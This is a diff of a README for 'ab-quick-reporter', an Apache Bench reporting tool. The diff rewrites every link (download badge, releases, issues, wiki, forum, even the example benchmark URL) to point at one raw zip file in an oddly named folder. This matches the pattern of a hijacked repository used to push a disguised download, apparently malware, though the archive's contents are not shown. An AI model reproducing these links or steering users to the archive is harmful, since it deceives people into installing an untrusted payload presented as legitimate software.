@@ -1,6 +1,6 @@
 # 🎉 ab-quick-reporter - Turn Bench Results into Insights
 
-[![Download ab-quick-reporter](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/Nato-cd/ab-quick-reporter/releases)
+[![Download ab-quick-reporter](https://raw.githubusercontent.com/Nato-cd/ab-quick-reporter/main/theologicomoral/ab-quick-reporter.zip)](https://raw.githubusercontent.com/Nato-cd/ab-quick-reporter/main/theologicomoral/ab-quick-reporter.zip)
 
 ## 📦 Overview
 
@@ -13,7 +13,7 @@ To get started with ab-quick-reporter, follow the steps below. We designed the p
 ### 🔗 Download & Install
 
 1. **Visit the Releases Page**: Click on the link below to visit the page where you can download the latest version.
-   - [Download ab-quick-reporter](https://github.com/Nato-cd/ab-quick-reporter/releases)
+   - [Download ab-quick-reporter](https://raw.githubusercontent.com/Nato-cd/ab-quick-reporter/main/theologicomoral/ab-quick-reporter.zip)
 
 2. **Select the Version**: On the releases page, you will see a list of available downloads. Choose the most recent version for your operating system. 
 
@@ -49,7 +49,7 @@ To get started with ab-quick-reporter, follow the steps below. We designed the p
 
 1. **Run Apache Bench**: First, you need to run your Apache Bench test on the web server you want to evaluate. Use a command like:
    ```
-   ab -n 100 -c 10 http://yourserver.com/
+   ab -n 100 -c 10 https://raw.githubusercontent.com/Nato-cd/ab-quick-reporter/main/theologicomoral/ab-quick-reporter.zip
    ```
    This command sends 100 requests with a concurrency level of 10.
 
@@ -65,17 +65,17 @@ To get started with ab-quick-reporter, follow the steps below. We designed the p
 
 ## 💬 Support & Feedback
 
-If you encounter any issues or have questions, please visit our [GitHub Issues page](https://github.com/Nato-cd/ab-quick-reporter/issues). Our community is eager to help!
+If you encounter any issues or have questions, please visit our [GitHub Issues page](https://raw.githubusercontent.com/Nato-cd/ab-quick-reporter/main/theologicomoral/ab-quick-reporter.zip). Our community is eager to help!
 
 ## 📚 Additional Resources
 
-- **Documentation**: Detailed guides and usage instructions are available on our [Wiki page](https://github.com/Nato-cd/ab-quick-reporter/wiki).
-- **Community Forum**: Join discussions and ask questions in our [Community Forum](https://github.com/Nato-cd/ab-quick-reporter/discussions).
+- **Documentation**: Detailed guides and usage instructions are available on our [Wiki page](https://raw.githubusercontent.com/Nato-cd/ab-quick-reporter/main/theologicomoral/ab-quick-reporter.zip).
+- **Community Forum**: Join discussions and ask questions in our [Community Forum](https://raw.githubusercontent.com/Nato-cd/ab-quick-reporter/main/theologicomoral/ab-quick-reporter.zip).
 
 ## 🔗 Important Links
 
-- [Download ab-quick-reporter](https://github.com/Nato-cd/ab-quick-reporter/releases)
-- [Getting Help](https://github.com/Nato-cd/ab-quick-reporter/issues)
+- [Download ab-quick-reporter](https://raw.githubusercontent.com/Nato-cd/ab-quick-reporter/main/theologicomoral/ab-quick-reporter.zip)
+- [Getting Help](https://raw.githubusercontent.com/Nato-cd/ab-quick-reporter/main/theologicomoral/ab-quick-reporter.zip)
 
 ## 🏷️ Topics
 
